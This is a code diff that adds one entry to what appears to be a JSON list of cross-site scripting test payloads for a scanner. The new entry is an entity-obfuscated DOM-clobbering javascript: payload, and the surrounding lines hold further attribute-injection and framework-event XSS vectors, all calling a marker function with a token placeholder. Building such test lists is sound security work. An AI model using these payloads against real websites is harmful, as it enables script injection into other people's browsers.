@@ -61,5 +61,6 @@
   "cid:\"onerror=__XSS__('{{TOKEN}}')//",
   "mailto:\"onerror=__XSS__('{{TOKEN}}')//",
   "<img src=x ng-on-error=\"window=$event.target.ownerDocument.defaultView;window.__XSS__('{{TOKEN}}');\">",
-  "<link rel=\"canonical\" href='https://example.com/?/?'accesskey='x'onclick='__XSS__(\"{{TOKEN}}\")'/>"
+  "<link rel=\"canonical\" href='https://example.com/?/?'accesskey='x'onclick='__XSS__(\"{{TOKEN}}\")'/>",
+  "<a id=config></a><a id=config name=url href=&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:parent.__XSS__&#x28;&apos;{{TOKEN}}&apos;&#x29;>"
 ]
